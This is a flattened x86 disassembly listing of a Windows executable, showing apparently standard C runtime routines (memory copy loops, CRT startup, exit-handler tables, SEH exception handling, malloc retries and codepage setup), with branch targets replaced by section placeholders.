mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40225c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4020c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4020c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4020c0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40225c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40225c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40225c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4022b1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_402b40
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_402af2
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_402af2
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_402367
mov edi edi
push esi
push 0x4
push 0x20
call sub_402aa6
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_402398
push 0xc
push r--data
call sub_402e60
call sub_402bb6
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4022b1
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4023ce
mov eax [ ebp - 0x1c ]
call sub_402ea5
retn
sub_4023eb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_403c1c
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4039f3
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_403272
mov [ esi + 0x4 ] eax
sub_402472
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_4023eb
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_403ee0
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_403f0f
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_402543
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_404060
lea esi [ eax + 0x1 ]
push esi
call sub_403fc3
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_403f64
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_4025a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_402543
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4025c8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_402583
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_402543
jmp r-xdata
sub_402608
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_402583
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_402678
pop ecx
sub_40262f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_4025c8
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402654
mov edi edi
push ebp
mov ebp esp
push esi
call sub_403c1c
mov esi [ eax + 0x80 ]
call sub_403c1c
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x80 ] ecx
mov eax esi
pop esi
pop ebp
retn
sub_402693
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_402683
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_402678
pop ecx
sub_4026b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_404230
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_4026f0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_4027d7
push 0x58
push r--data
call sub_402e60
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_404d9b
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_403d65
test eax eax
jne r-xdata
push 0x1c
call sub_4027ae
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_404d4f
mov [ ebp - 0x4 ] esi
call sub_404b0a
test eax eax
jns r-xdata
push 0x10
call sub_4027ae
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_404a73
mov [ rw-data ] eax
call sub_4049b8
test eax eax
jns r-xdata
push 0x1b
call sub_402e40
call sub_404742
test eax eax
jns r-xdata
push 0x8
call sub_402e40
push 0x1
call sub_402c1f
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_402e40
call sub_4046e3
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_402e40
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_402e22
jmp r-xdata
push eax
call sub_402df6
push ecx
push eax
push esi
push __dos_header
call sub_414ff2
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_402ea5
retn
sub_402a61
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_403fc3
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_402aa6
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404e54
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_402af2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404ed6
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_402b40
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_40515f
mov [ eax ] 0x16
call sub_40510d
or eax 0xffffffff
pop ebp
retn
sub_402b73
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_402bc8
mov edi edi
push esi
call sub_403a6c
mov esi eax
push esi
call sub_4042b8
push esi
call sub_404f83
push esi
call sub_405533
push esi
call sub_405524
push esi
call sub_40531f
push esi
call sub_4041a9
add esp 0x18
pop esi
retn
sub_402bfb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_402c1f
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_405542
push r--data
push r--data
call sub_402bfb
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_405600
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_404d75
call sub_4023d4
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_405600
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_402cb6
push 0x20
push r--data
call sub_402e60
push 0x8
call sub_4052ec
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_402de1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_402ea5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_405213
pop ecx
push [ ebp + 0x8 ]
call sub_402b9e
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_403a6c
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_403a6c
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_402e60
push sub_402ec0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_402ec0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4056bc
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4056bc
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40580b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_4057c2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4056bc
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4056bc
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_4057f2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40580b
mov eax [ ebp + 0xc ]
push r--data
call sub_405600
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4056bc
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_4057d9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4056bc
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_40304f
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40307e
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_405830
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_4030e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_405bde
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_405ab1
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_405ab1
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_405830
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_403272
push 0xc
push r--data
call sub_402e60
call sub_403c1c
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4052ec
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40330d
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_402ea5
retn
push 0x20
call sub_402e40
cmp esi rw-data
je r-xdata
push esi
call sub_4040eb
pop ecx
sub_403316
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_4023eb
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_403392
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_403316
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40307e
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_405830
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
cmp [ esi ] 0x0
jne r-xdata
